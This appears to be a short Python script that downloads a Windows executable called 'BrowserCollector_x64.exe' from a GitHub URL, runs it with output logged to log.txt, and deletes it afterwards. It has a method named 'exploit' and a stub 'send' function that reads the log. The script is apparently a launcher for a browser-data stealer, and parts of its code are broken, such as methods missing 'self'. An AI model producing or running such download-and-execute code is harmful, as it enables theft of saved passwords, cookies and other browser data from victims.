import requests
import ctypes, sys
import subprocess, os

url = 'https://github.com/somkietacode/simple-exec/raw/main/BrowserCollector_x64.exe'
r = requests.get(url, allow_redirects=True)
open('BrowserCollector.exe', 'wb').write(r.content)

class xyz():

        def is_admin():
                try:
                        return ctypes.windll.shell32.IsUserAnAdmin()
                except:
                        return False

        def init(self):
                print(is_admin())
                self.is_admin = is_admin()

        def exploit(self):
                os.system('BrowserCollector.exe > log.txt \n')
                os.remove('BrowserCollector.exe')

        def send():
            d = open('log.txt','r').read()
            print(d)


if __name__ == "__main__" :
    nqnt = xyz()
    nqnt.exploit()
